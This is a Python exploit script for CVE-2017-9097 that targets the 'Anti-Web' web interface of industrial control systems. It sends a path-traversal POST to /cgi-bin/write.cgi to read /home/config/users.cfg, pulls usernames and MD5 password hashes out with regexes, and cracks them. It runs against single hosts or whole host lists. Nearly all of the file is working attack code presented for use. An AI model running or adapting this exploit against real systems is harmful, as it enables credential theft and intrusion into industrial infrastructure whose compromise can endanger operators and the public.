# -*- coding: utf-8 -*- 
import requests
import argparse
from breakMd5 import *
import time
import sys

import re

headers = {}

class Colors:
    BLUE 		= '\033[94m'
    GREEN 		= '\033[32m'
    RED 		= '\033[0;31m'
    DEFAULT		= '\033[0m'
    ORANGE 		= '\033[33m'
    WHITE 		= '\033[97m'
    BOLD 		= '\033[1m'
    BR_COLOUR 	= '\033[1;37;40m'



banner = '''
.▄▄ · ▄▄▄ .▄▄▄ .▄ •▄      ▄▄▄·  ▐ ▄ ·▄▄▄▄      ·▄▄▄▄  ▄▄▄ ..▄▄ · ▄▄▄▄▄▄▄▄         ▄· ▄▌
▐█ ▀. ▀▄.▀·▀▄.▀·█▌▄▌▪    ▐█ ▀█ •█▌▐███▪ ██     ██▪ ██ ▀▄.▀·▐█ ▀. •██  ▀▄ █·▪     ▐█▪██▌
▄▀▀▀█▄▐▀▀▪▄▐▀▀▪▄▐▀▀▄·    ▄█▀▀█ ▐█▐▐▌▐█· ▐█▌    ▐█· ▐█▌▐▀▀▪▄▄▀▀▀█▄ ▐█.▪▐▀▀▄  ▄█▀▄ ▐█▌▐█▪
▐█▄▪▐█▐█▄▄▌▐█▄▄▌▐█.█▌    ▐█ ▪▐▌██▐█▌██. ██     ██. ██ ▐█▄▄▌▐█▄▪▐█ ▐█▌·▐█•█▌▐█▌.▐▌ ▐█▀·.
 ▀▀▀▀  ▀▀▀  ▀▀▀ ·▀  ▀     ▀  ▀ ▀▀ █▪▀▀▀▀▀•     ▀▀▀▀▀•  ▀▀▀  ▀▀▀▀  ▀▀▀ .▀  ▀ ▀█▄▀▪  ▀ • 

 [+] 𝕊𝕖𝕖𝕜 𝕒𝕟𝕕 𝔻𝕖𝕤𝕥𝕣𝕠𝕪...
 ( Breaking the credentials of your industrial control system )

'''
	# Seek and destroy...

details = '''
 # Test: 	Apps industrial OT over Server: "Anti-Web 3.0.x < 3.8.x"
 # CVE:		CVE-2017-9097
 # Date: 	15/05/2017
 # Vendor:   	Multiples vendors
 # Category:	Industrial OT webapps

 # POC: 	https://www.youtube.com/watch?v=HdkZA1DO08Y 

 by:
   * Fernandez Ezequiel ( %s )
   * Bertin Jose ( %s )
''' %(Colors.GREEN+"@capitan_alfa"+Colors.BLUE,Colors.GREEN+"@bertinjoseb"+Colors.DEFAULT)

parser = argparse.ArgumentParser(prog='seekAndDestroy.py',
								description=' [+] Obtain and break the credentials of your industrial control system .', 
								epilog='[+] Usage: seelAndDestroy.py --list host_list.txt --port 8080',
								version="1")

parser.add_argument('--host', dest="HOST",  		help='host')
parser.add_argument('--list', dest="HOST_LIST",  	help='hosts', default=False)
parser.add_argument('--port', dest="PORT",  		help='set port (default = 80)',  default="80", required=False)


args 	= parser.parse_args()

HST   	= args.HOST
LST   	= args.HOST_LIST
PRT 	= args.PORT

print Colors.GREEN+banner
print Colors.BLUE+details

def reqLFI(hst, prt):
	host 		=  "http://"+hst+":"+prt+"/"
	fullHost 	=  "http://"+hst+":"+prt+"/cgi-bin/write.cgi"

	LFI 	= "../../../../../../home/config/users.cfg"
	ContLen = str(len(LFI))

	headers["Host"] 			=  hst
	headers["User-Agent"]		= "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
	headers["Accept"] 			= "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
	headers["Content-Length"]	=  ContLen
	headers["Accept-Languag"] 	= "es-AR,en-US;q=0.7,en;q=0.3"
	headers["Referer"] 			=  fullHost
	headers["Connection"] 		= "close"
	headers["Content-Type"] 	= "application/x-www-form-urlencoded"

	thePost0 = "page=/&template="+LFI
	
	r0 = requests.post(fullHost, data=thePost0,headers=headers,timeout=15.000)
	users_cfg = r0.text

	return users_cfg

# ----------------------------------- #
ptrUsr =  re.compile(r"[\w.[]+[a-zA-Z0-9]+[\w.]]")

#catch "hash md5":
ptrPass =	re.compile(r"[a-f0-9]{32}")
ptrMail = 	re.compile(r"\w+@\w+\D\w+\b")

#poor [tab] solution
def getTabs(nT):
	tabs = "\t"
	
	if nT < 5:	
		return tabs*3
	elif nT < 13:	
		return tabs*2
	elif nT < 21:
		tabs = (tabs)*1
		return tabs
	else:
		tabs = (tabs)*1
		return tabs

title = ''' +---------------+-------------------------------------------------------+
 | Users\t | hashes = MD5( Password + Username )\t\t\t |	
 +---------------+-------------------------------------------------------+''' 


if LST:

	with open(LST, 'r') as LH:
		try:
		# ----------------------------------------------------------------------------- 
			for nHst in LH:
				HOST = nHst[:-1]
				try:
					users_cfg = reqLFI(HOST, PRT)
					# ----------------------------------- #
					userList = ptrUsr.findall(users_cfg)
					hashList = ptrPass.findall(users_cfg)
					#mails 	= ptrMail.findall(users_cfg)
					# ----------------------------------- #

					usersTot = len(userList) 
					credsTot = len(hashList)
					print Colors.GREEN+"\n [*] HOST:\t"+Colors.ORANGE+"http://"+Colors.GREEN+(HOST)+Colors.RED+":"+Colors.BLUE+(PRT)+Colors.ORANGE+"/"
					print title+Colors.DEFAULT

					for nUser in range(0, usersTot):

						# -- existe un hash? ------------------------- #
						try:
							hashCred = hashList[nUser]
						except Exception:
							hashCred = " --- "
						# -- --------------- ------------------------- #
						
						username 	= userList[nUser]
						plane 		= getMD5(hashCred, username)

						print Colors.ORANGE+" | "+Colors.DEFAULT + username +  getTabs(len(username)) + hashCred +  getTabs(len(hashCred))+ "( "+plane+" )"
						

					print Colors.ORANGE+" +---------------+-------------------------------------------------------+"+Colors.DEFAULT		

				except Exception:
					print Colors.GREEN+"\n [*] HOST:\t"+Colors.ORANGE+"http://"+Colors.GREEN+(HOST)+Colors.RED+":"+Colors.BLUE+(PRT)+Colors.ORANGE+"/"
					print Colors.RED+" [ Fail conection ] "+Colors.DEFAULT
		# ----------------------------------------------------------------------------- 
		except KeyboardInterrupt:
			print Colors.RED+'\nInterrupted\n\n'+Colors.DEFAULT
	        exit(0)

elif HST: 
	users_cfg = reqLFI(HST, PRT)
	# ----------------------------------- #
	userList = ptrUsr.findall(users_cfg)
	hashList = ptrPass.findall(users_cfg)
	#mails 	= ptrMail.findall(users_cfg)
	# ----------------------------------- #

	usersTot = len(userList) 
	credsTot = len(hashList)

	print Colors.ORANGE+title+Colors.DEFAULT
			
	for nUser in range(0, usersTot):

		# -- existe un hash? ------------------------- #
		try:
			hashCred = hashList[nUser]
		except Exception:
			hashCred = " --- "
		# -- --------------- ------------------------- #
		
		username = userList[nUser]
		plane = getMD5(hashCred, username)

		print Colors.ORANGE+" | "+Colors.DEFAULT + username +  getTabs(len(username)) + hashCred +  getTabs(len(hashCred))+ "( "+plane+" )"
		
	print Colors.ORANGE+" +---------------+-------------------------------------------------------+"+Colors.DEFAULT		

else:
	failOpt = "HOST or HOST_LIST"
	print failOpt
	exit(0)
